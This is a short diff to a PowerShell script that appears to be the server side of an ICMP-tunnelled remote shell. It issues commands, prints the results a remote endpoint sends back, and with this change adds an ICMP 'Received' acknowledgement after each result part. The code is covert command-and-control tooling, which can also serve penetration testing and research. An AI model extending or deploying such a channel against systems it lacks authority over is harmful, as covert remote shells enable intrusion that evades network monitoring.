@@ -11,6 +11,7 @@ enum ServerMessageType {
 	NeedsPrompt = 34
 	IssuingCommand = 9
 	Stop = 2
+	Received = 7
 }
 
 enum ServerState {
@@ -195,10 +196,12 @@ public static class LIBC
 				Switch ($MessageType) {
 					CommandResultPart {
 						Write-Host -NoNewline ([Text.Encoding]::UTF8.GetString($MessageData));
+						Send-ICMPMessage -ICMPHeader $ICMPHeader -Endpoint $Endpoint -MessageType Received;
 						Break;
 					}
 					CommandResultEnd {
 						Write-Host ([Text.Encoding]::UTF8.GetString($MessageData));
+						Send-ICMPMessage -ICMPHeader $ICMPHeader -Endpoint $Endpoint -MessageType Received;
 						$State = [ServerState]::WaitingForPrompt;
 						Break;
 					}
